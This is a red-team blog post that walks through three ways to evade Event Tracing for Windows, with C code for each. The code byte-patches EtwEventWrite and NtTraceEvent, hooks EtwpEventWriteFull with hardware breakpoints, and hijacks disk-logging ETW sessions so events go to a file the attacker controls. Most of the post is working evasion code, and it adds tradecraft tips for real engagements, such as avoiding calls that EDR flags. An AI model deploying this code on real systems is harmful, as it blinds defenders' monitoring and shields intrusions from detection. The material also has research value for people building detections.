---
title: "ETW Evasion Techniques: Byte Patching, Hardware Breakpoints & Session Hijacking"
date: 2025-10-19 09:37:00 +0000
categories: [Red Team, Windows Internals]
tags: [etw, windows-internals, malware-analysis, edr, evasion, c]
description: "A complete guide to evading Event Tracing for Windows (ETW) using byte patching, hardware breakpoints, and session hijacking — all written in C."
---

> **Before we begin:** All code discussed in this blog is available in my GitHub repo:  
> [https://github.com/Zanebilal/ETW-Evasion](https://github.com/Zanebilal/ETW-Evasion)

Welcome to this write-up on Event Tracing for Windows (ETW). This covers multiple techniques for bypassing ETW — a telemetry source heavily used by EDR systems and blue-team detection. Before diving deeper, you should have a basic familiarity with ETW: what it is, its components, and how it works internally. Here are some resources to get you up to speed:

- [Part 1 - ETW Introduction and Overview (Microsoft)](https://learn.microsoft.com/en-gb/archive/blogs/ntdebugging/part-1-etw-introduction-and-overview)
- [About Event Tracing - Win32 apps (Microsoft)](https://learn.microsoft.com/en-us/windows/win32/etw/about-event-tracing)
- [ETW: Event Tracing for Windows 101 - Red Team Notes](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101)
- Windows Internals Part 2 (7th Ed.): [https://www.amazon.com/Windows-Internals-Part-2-7th/dp/0135462401](https://www.amazon.com/Windows-Internals-Part-2-7th/dp/0135462401)

---

## Technique 1 — ETW Bypass via Byte Patching

ETW patching replaces some bytes with other bytes. The WinAPIs used by providers to write to an ETW session are `EtwEventWrite`, `EtwEventWriteEx`, and `EtwEventWriteFull`. If we hook or apply patches to these WinAPIs at the start, we prevent them from executing their original code, so the ETW session receives nothing — leading to ETW evasion. We also need to patch the `NtTraceEvent` syscall function, which is invoked by the previously mentioned WinAPI functions after they execute.

### How To Apply a Patch

**For the WinAPI functions:** Place the `ret` instruction at the start of the function so it immediately returns without executing its code. We also need it to return `ERROR_SUCCESS` (zero), so we XOR `eax` with itself before returning. The target functions are patched using:

- `33 C0` → `xor eax, eax`
- `C3` → `ret`

**For the `NtTraceEvent` syscall:** Modify the SSN byte to a random value, causing the syscall to fail with `STATUS_INVALID_PARAMETER` (`0xC000000D`).

### Implementation

The `PatchEtwEventWrite` function blocks the write event WinAPIs. It uses `GetProcAddress` to retrieve the target function's address, writes the patch bytes using `VirtualProtect`, then restores the old permissions.

> **Note:** In real engagements, avoid `GetProcAddress` as it appears in the IAT and is flagged as suspicious.

```c
//#@z0b1l4l

#include<stdio.h>
#include<windows.h>

typedef enum PATCHFUNC {
 PATCH_ETW_EVENT_WRITE,
 PATCH_ETW_EVENT_WRITE_EX,
 PATCH_ETW_EVENT_WRITE_FULL
};

BOOL PatchEtwEventWrite(enum PATCHFUNC ePatchFunc) {

 PBYTE pEtwFuncAddr = NULL;
 DWORD dwOldProtection = NULL;
 BYTE pPatchBytes[3] = {
       0X33 , 0XC0, // xor eax, eax
       0XC3   // ret
        };

 // getting the address of the ETW event write function based on one of the three cases
 pEtwFuncAddr = GetProcAddress(GetModuleHandleA("NTDLL"),
  (ePatchFunc == PATCH_ETW_EVENT_WRITE) ? "EtwEventWrite" :
  (ePatchFunc == PATCH_ETW_EVENT_WRITE_EX) ? "EtwEventWriteEx" : "EtwEventWriteFull"
 );

 if (!pEtwFuncAddr) {
  printf("[!] GetProcAddress failed with error %d \n", GetLastError());
  return FALSE;
 }
 printf("[+] Address of %s is : 0x%p ",
  (ePatchFunc == PATCH_ETW_EVENT_WRITE) ? "EtwEventWrite" :
  (ePatchFunc == PATCH_ETW_EVENT_WRITE_EX) ? "EtwEventWriteEx" : "EtwEventWriteFull",
  pEtwFuncAddr);

 getchar();

 // changing the memory permission to insert the patches
 if (!VirtualProtect(pEtwFuncAddr, sizeof(pPatchBytes), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
  printf("[!] VirtualProtect [1] failed with error %d \n", GetLastError());
  return FALSE;
 }
 printf("[+] Patching the bytes ..");
 // write the patch
 memcpy(pEtwFuncAddr, pPatchBytes, sizeof(pPatchBytes));
 printf("[+] DONE !\n");

 // restore the memory permission
 if (!VirtualProtect(pEtwFuncAddr, sizeof(pPatchBytes), dwOldProtection, &dwOldProtection)) {
  printf("[!] VirtualProtect [2] failed with error %d \n", GetLastError());
  return FALSE;
 }

 return TRUE;
}

int main() {

 PatchEtwEventWrite(PATCH_ETW_EVENT_WRITE);
 PatchEtwEventWrite(PATCH_ETW_EVENT_WRITE_EX);
 PatchEtwEventWrite(PATCH_ETW_EVENT_WRITE_FULL);

 printf("[#] Press < Enter > To Quit ..\n");
 getchar();

 return 0;
}
```

From x64dbg, we can verify that the first bytes of the targeted WinAPI function changed to what we want, and the function executes successfully without running any of its code logic.

For the syscall, `PatchNtEventTraceSSN` manipulates the SSN. Recall how the syscall is structured:

```asm
4C 8BD1 | mov r10,rcx
B8 XXXXXXXX | mov eax, <SSN>
0F05 | syscall
```

Our function searches for the `B8` opcode (`mov eax`), then uses `VirtualProtect` to change memory permissions and replaces the original SSN with a dummy value like `0xFF`:

```c
//#@z0b1l4l

#include<stdio.h>
#include<windows.h>

#define RET_INSTRUCTION_OPCODE 0XC3
#define MOV_INSTRUCTION_OPCODE 0xB8
#define SYSCALL_SIZE 0x20

BOOL PatchNtTraceEvent() {

 PBYTE pNtTraceEventAddr = NULL;
 DWORD dwOldProtection = NULL;

 // get the address of the syscall function
 pNtTraceEventAddr = GetProcAddress(GetModuleHandleA("NTDLL"), "NtTraceEvent");
 if (!pNtTraceEventAddr) {
  printf("[!] GetProcAddress failed with error %d \n", GetLastError());
  return FALSE;
 }

 printf("[+] Address of 'NtTraceEvent' is : 0x%p ", pNtTraceEventAddr);
 getchar();
 // searching for the mov instruction
 for (int i = 0; i < SYSCALL_SIZE; i++) {

  if (pNtTraceEventAddr[i] == MOV_INSTRUCTION_OPCODE) {

   // get the NtTraceEvent' SSN
   pNtTraceEventAddr = (PBYTE)(&pNtTraceEventAddr[i] + 1);
   printf("[+] Address of 'NtTraceEvent' SSN is : 0x%p \n", pNtTraceEventAddr);
   break;
  }

  // if we escape the SSN or we reach to the end
  if (pNtTraceEventAddr[i] == RET_INSTRUCTION_OPCODE || pNtTraceEventAddr[i] == 0x0F || pNtTraceEventAddr[i] == 0x05)
   return FALSE;
 }

 // change the memory permissions
 if (!VirtualProtect(pNtTraceEventAddr, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
  printf("[!] VirtualProtect [1] failed with error %d \n", GetLastError());
  return FALSE;
 }

 printf("[+] Patching the bytes ..");
 // apply the patch with dummy SSN value 0xFF ( in reverse order )
 *(PDWORD)pNtTraceEventAddr = 0x000000FF;
 printf("[+] DONE !\n");
 // restore the original memory permissions
 if (!VirtualProtect(pNtTraceEventAddr, sizeof(DWORD), dwOldProtection, &dwOldProtection)) {
  printf("[!] VirtualProtect [2] failed with error %d \n", GetLastError());
  return FALSE;
 }

 return TRUE;

}


int main() {

 PatchNtTraceEvent();

 printf("[#] Press < Enter > To Quit ..\n");
 getchar();

 return 0;
}
```

> **Note:** `NtTraceEvent` is called by several WinAPIs, so patching it is dangerous and may result in unexpected behavior.

---

## Technique 2 — ETW Bypass via Hardware Breakpoints (HBPs)

While Technique 1 works, it has a drawback: it uses `VirtualProtect` to set `RWX` permissions, which is suspicious to EDRs, and the written function content can be detected by memory scanners.

To avoid this, we hook `EtwpEventWriteFull` using hardware breakpoints. As seen in the x64dbg output, all three patched WinAPIs call `EtwpEventWriteFull` before they return — so hooking it once covers all of them.

> Resources on hardware breakpoints:
> - [https://www.nynaeve.net/?p=80](https://www.nynaeve.net/?p=80)
> - [Hardware vs Software Breakpoints (StackOverflow)](https://stackoverflow.com/questions/8878716/what-is-the-difference-between-hardware-and-software-breakpoints)
> - [Vectored Exception Handling (Microsoft)](https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling)

### Implementation

**Step 1:** Create the detour function `EtwpEventWriteFullDetour`. It must return `ERROR_SUCCESS` by setting `EAX` to 0, and use `BLOCK_REAL` to update `EIP` to point to the `ret` instruction of `EtwpEventWriteFull`, skipping its body:

```c
VOID EtwpEventWriteFullDetour(PCONTEXT Ctx) {
  RETURN_VALUE(Ctx, (ULONG)0);
  BLOCK_REAL(Ctx);
  CONTINUE_EXECUTION(Ctx);
}
```

**Step 2:** Ensure newly created threads also have the hook installed (events can be written by different threads):

```c
int main() {
  // ... code ...

  // Install the same hooks on new threads created in the future - using the Dr1 register
  if (!InstallHooksOnNewThreads(Dr1))
    return -1;

  // ... code ...
}
```

**Step 3:** Implement `FetchEtwpEventWriteFullAddr` to retrieve the address of `EtwpEventWriteFull` from `EtwEventWrite`. Here's the relevant assembly from `EtwEventWrite`:

```asm
00007FFCC7C7FBE4 | E8 0F000000 | call <ntdll.EtwpEventWriteFull>
00007FFCC7C7FBE9 | 48:83C4 58  | add rsp,58
00007FFCC7C7FBED | C3          | ret
```

The offset is `0F000000` (big-endian → `0000000F`). Adding it to the call instruction address gives us `EtwpEventWriteFull`'s address:

```c
PVOID FetchEtwpEventWriteFullAddr() {

 PBYTE pEtwEventWriteAddr = NULL;
 INT i = 0;
 DWORD dwOffset = 0x00;

 // Get the address of EtwEventWrite function from ntdll.dll
 pEtwEventWriteAddr = GetProcAddress(GetModuleHandleA("Ntdll.dll"), "EtwEventWrite");
 if (!pEtwEventWriteAddr) {
  return NULL;
 }

 printf("[+] pEtwEventFunc : 0x%0p \n", pEtwEventWriteAddr);

 // get the ret instruction address
 while (TRUE) {
  // check for ret opcode followed by int3 opcode
  if (pEtwEventWriteAddr[i] == x64_RET_INSTRUCTION_OPCODE && pEtwEventWriteAddr[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
   break;
  i++;
 }

 while (i) {
  // check for call opcode
  if (pEtwEventWriteAddr[i] == x64_CALL_INSTRUCTION_OPCODE) {
   pEtwEventWriteAddr = (PBYTE)&pEtwEventWriteAddr[i];
   break;
  }
  i--;
 }

 // If the first opcode is not 'call', return null
 if (pEtwEventWriteAddr != NULL && pEtwEventWriteAddr[0] != x64_CALL_INSTRUCTION_OPCODE) {
  return NULL;
 }

 printf("[+] pEtwEventWriteFull : 0x%0p \n", pEtwEventWriteAddr);

 // skip the call instruction opcode: E8 byte
 pEtwEventWriteAddr++;

 // get the offset of the pEtwEventWriteFull
 dwOffset = *(DWORD*)pEtwEventWriteAddr;
 printf("\t> Offset : 0x%0.8X \n", dwOffset);

 // Adding the size of the offset to reach the end of the call instruction
 pEtwEventWriteAddr += sizeof(DWORD);

 // Adding the offset to the pointer reaching the address of 'EtwpEventWriteFull'
 pEtwEventWriteAddr += dwOffset;

 // now pEtwEventWriteAddr has the address of EtwpEventWriteFull
 return (PVOID)pEtwEventWriteAddr;
}
```

**Step 4:** The `main` function ties everything together using the `HardwareBreaking.h` library:

```c
int main() {

 PVOID pEtwEventWriteFullAddr = FetchEtwpEventWriteFullAddr();
 if (!pEtwEventWriteFullAddr) {
  return -1;
 }

 printf("[+] pEtwpEventWriteFull : 0x%p \n", pEtwEventWriteFullAddr);

 // Initialize the hardware breakpoint
 if (!InitHardwareBreakpointHooking()) {
  return -1;
 }

 printf("[i] Installing Hooks ... ");

 // replacing 'EtwpEventWriteFull' with 'EtwpEventWriteFullDetour' with ALL_THREADS flag using Dr0 register
 if (!InstallHardwareBreakingPntHook(pEtwEventWriteFullAddr, Dr0, EtwpEventWriteFullDetour, ALL_THREADS)) {
  return -1;
 }

 // Install the same 'ALL_THREADS' hooks on new threads created in the future using the Dr1 register
 printf("[i] Installing The Same Hooks On New Threads ... ");
 if (!InstallHooksOnNewThreads(Dr1))
  return -1;
 printf("[+] DONE \n");

 // Clean up
 printf("[#] Press <Enter> To Quit ... ");
 getchar();

 if (!CleapUpHardwareBreakpointHooking())
  return -1;

 return 0;

}
```

After execution, the `Dr0` register holds the address of `EtwpEventWriteFull` and `Dr1` holds `EtwpEventWriteFullDetour`.

> While this technique is more effective than Technique 1, we're still targeting a single function. An alternative approach — Session Hijacking — is discussed next.

---

## Technique 3 — Bypassing ETW via Session Hijacking

In the previous techniques, we bypassed ETW using byte patching and hardware breakpoints. Both work, but come with drawbacks:

- **Byte patching** modifies memory regions with `RWX` permissions — detectable by memory scanners.
- **Hardware breakpoints** target only `EtwpEventWriteFull` — just one ETW function.

So the question becomes: **how can I bypass ETW without revealing myself and guarantee that no event written to an ETW session can reach consumers?** Session Hijacking is the answer.

### Session Hijacking Technique

This technique evades ETW without noise by targeting **running ETW sessions**. If we hijack a session, its intended functionality — delivering telemetry to a consumer (in ETL files) — is stopped. Telemetry data is instead redirected to a file we own at a path we provide.

> **Note:** Some sessions don't store telemetry in log files (e.g., ProcMon's `PROCMON TRACE` delivers events in real time). This technique applies to **disk-logging sessions** only.

### Steps to Hijack a Session

1. Enumerate all running sessions to check if the target session exists and is in a running state.
2. Stop the target session (requires **administrative privileges**).
3. Add a new file trace in the session's properties, pointing to a path we control.
4. Resume the target session — all generated events are now redirected to our file.

### Implementation

#### 1 — Enumerating Active Sessions

We use [`QueryAllTracesW`](https://learn.microsoft.com/en-us/windows/win32/api/evntrace/nf-evntrace-queryalltracesw) to retrieve information about all active sessions. The maximum number of ETW sessions in the system is 64, so we provide an array of 64 `PEVENT_TRACE_PROPERTIES` elements and populate the `Wnode.BufferSize`, `LoggerNameOffset`, and `LogFileNameOffset` fields. We then compare each session name against the target session name:

```c
PEVENT_TRACE_PROPERTIES SessionInfo[MAXIMUM_SESSIONS] = { 0 };
PEVENT_TRACE_PROPERTIES Storage, StoragePtr = NULL;

ULONG SizeOfOneSession = sizeof(EVENT_TRACE_PROPERTIES) + 2 * MAXSTR * sizeof(TCHAR);
ULONG SizeNeeded = MAXIMUM_SESSIONS * SizeOfOneSession;
ULONG SessionCounter = 0;
ULONG uStatus = ERROR_SUCCESS;
ULONG SessionCount = NULL;
ULONG ReturnCount = 0;

LPTSTR SessionName = NULL;

BOOL bFound = FALSE;

Storage = (PEVENT_TRACE_PROPERTIES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SizeNeeded);
if (Storage == NULL) {
 return -1;
}

StoragePtr = Storage;

// Initializing the SessionInfo structure
for (SessionCounter = 0; SessionCounter < MAXIMUM_SESSIONS; SessionCounter++) {

 // populate the required elements (according to Microsoft)
 Storage->Wnode.BufferSize = SizeOfOneSession;
 Storage->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
 Storage->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + MAXSTR * sizeof(TCHAR);

 // saving the session pointers in array
 SessionInfo[SessionCounter] = Storage;

 // move to the next structure
 Storage = (PEVENT_TRACE_PROPERTIES)((PUCHAR)Storage + Storage->Wnode.BufferSize);

}

// Querying all the running sessions
uStatus = QueryAllTracesW(SessionInfo, MAXIMUM_SESSIONS, &ReturnCount);
if (uStatus == ERROR_SUCCESS) {

 // traversing the running sessions
 for (SessionCount = 0; SessionCount < ReturnCount; SessionCount++) {

  // check if the session name exists
  if ((SessionInfo[SessionCount]->LoggerNameOffset > 0) && (SessionInfo[SessionCount]->LoggerNameOffset < SessionInfo[SessionCount]->Wnode.BufferSize)) {

   // calculating the address of the session name
   SessionName = (LPTSTR)((PUCHAR)SessionInfo[SessionCount] + SessionInfo[SessionCount]->LoggerNameOffset);
  }
  else {
   SessionName = NULL;
  }

  // comparing the obtained session name with the target session name
  if (SessionName != NULL && wcscmp(SessionName, TARGET_SESSION_NAME) == 0) {

   // session found
   wprintf("[i] Found target ETW tracing session, hijacking ...\n");

   // hijack the target session
   HijackEtwSession(SessionInfo[SessionCount]);

   bFound = TRUE;
   break;
  }
 }
}

if (!bFound)
 wprintf(L"[-] The Session \"%s\" Was Not Found \n", TARGET_SESSION_NAME);

// cleaning the allocated memory
HeapFree(GetProcessHeap(), 0, StoragePtr);
```

#### 2 — Stopping, Updating & Restarting the Session

After identifying the target session, the `HijackEtwSession` function handles the remaining steps:

- **Stop** the session using [`StopTraceW`](https://learn.microsoft.com/en-us/windows/win32/api/evntrace/nf-evntrace-stoptracew)
- **Modify** the `LogFileNameOffset` to point to our `FAKE_LOG_FILE`
- **Restart** the session using [`StartTraceW`](https://learn.microsoft.com/en-us/windows/win32/api/evntrace/nf-evntrace-starttracew)

This function runs in an infinite loop — so if the session properties are reset to the originals, it will re-hijack. It also calls [`QueryTraceW`](https://learn.microsoft.com/en-us/windows/win32/api/evntrace/nf-evntrace-querytracew) to verify if the session is still running, sleeping if it's not:

```c
VOID HijackEtwSession(IN PEVENT_TRACE_PROPERTIES SessionInfo) {

 while (TRUE) {

  ULONG bError = ERROR_SUCCESS;
  TRACEHANDLE SessionHandle = NULL;

  // verify if the target session is running
  if ((bError = QueryTraceW((TRACEHANDLE)0, TARGET_SESSION_NAME, SessionInfo)) != ERROR_SUCCESS && bError != ERROR_WMI_INSTANCE_NOT_FOUND) {
   printf("\t[-] QueryTraceW Failed With Error %d \n", bError);
   return;
  }

  if (bError == ERROR_WMI_INSTANCE_NOT_FOUND) {
   wprintf("[-] The Session \"%s\" is Not Running Anymore \n", TARGET_SESSION_NAME);
   printf("[-] Retrying To Find The Target Session ... \n");
   goto _Retry;
  }
  printf("\t[+] Successfully Queried The Target Session \n");

  // check if the session is already hijacked
  if (IsSessionHijacked(SessionInfo)) {
   wprintf("[-] The Session \"%s\" is Already Hijacked \n", TARGET_SESSION_NAME);
   goto _Retry;
  }

  printf("\t[i] Restarting Target Session With Hijacked Settings: \n");

  // stopping the target session
  wprintf("\t[i] Stopping The Target Session \"%s\" ... \n", TARGET_SESSION_NAME);
  if ((bError = StopTraceW((TRACEHANDLE)0, TARGET_SESSION_NAME, SessionInfo)) != ERROR_SUCCESS) {
   printf("\t[-] StopTraceW Failed With Error %d \n", bError);
   return;
  }
  printf("\t[+] DONE ... \n");

  // modifying the session properties to the malicious ones
  printf("\t[i] Modifying The Trace File Name   ... \n");
  wcscpy_s((LPWSTR)((PUCHAR)SessionInfo + SessionInfo->LogFileNameOffset), MAXSTR, FAKE_LOG_FILE);
  printf("\t[+] DONE ... \n");

  // restarting the target session
  wprintf("\t[i] Restarting The Target Session \"%s\" ... \n", TARGET_SESSION_NAME);
  if (bError = StartTraceW(&SessionHandle, (LPCWSTR)TARGET_SESSION_NAME, SessionInfo) != ERROR_SUCCESS) {
   printf("\t[-] StartTraceW Failed With Error %d \n", bError);
   return;
  }
  printf("\t[+] DONE ... \n");

 _Retry:
  Sleep(5000);
 }

}
```

The helper `IsSessionHijacked` checks whether the current log file path already matches `FAKE_LOG_FILE`:

```c
BOOL IsSessionHijacked(IN PEVENT_TRACE_PROPERTIES SessionInfo) {

 // calculating the address of the log file name
 LPTSTR LogFileName = (LPTSTR)((PUCHAR)SessionInfo + SessionInfo->LogFileNameOffset);

 // comparing the obtained log file name with the FAKE_LOG_FILE path
 return (*(ULONG_PTR*)LogFileName != NULL && wcscmp(LogFileName, FAKE_LOG_FILE) == 0) ? TRUE : FALSE;
}
```

The full code is available in the GitHub repo:  
[https://github.com/Zanebilal/ETW-Evasion](https://github.com/Zanebilal/ETW-Evasion)

### Execution Demo

**Create a test session** (run as administrator):

```bash
logman create trace "Test Session" -p "Microsoft-Windows-Kernel-Process" -o "C:\TestSession.etl" -ets
```

**Verify the session is running:**

```bash
logman query "Test Session" -ets
```

Set `TARGET_SESSION_NAME` and `FAKE_LOG_FILE` in the code, then run the program as administrator. Querying the session again will show the updated log file path — all telemetry data now flows to your hijacked file, and ETW consumers can no longer read the original logs.

---

## Conclusion

This write-up covered three ETW evasion techniques:

| Technique | Mechanism | Drawback |
|-----------|-----------|----------|
| Byte Patching | Patches `EtwEventWrite*` + `NtTraceEvent` | RWX memory is suspicious; detectable by memory scanners |
| Hardware Breakpoints | Hooks `EtwpEventWriteFull` via HBPs | Targets only one function; misses other event writers |
| Session Hijacking | Redirects session output to attacker-controlled file | Only works for disk-logging sessions, not real-time ones |

For real-time session consumers (like ProcMon), you would need to hook the API that providers use to write events (e.g., `EtwEventWrite` — discussed in Technique 1) or modify the kernel driver behavior itself.

For more reading on this topic:  
[https://www.binarly.io/blog/design-issues-of-modern-edrs-bypassing-etw-based-solutions](https://www.binarly.io/blog/design-issues-of-modern-edrs-bypassing-etw-based-solutions)
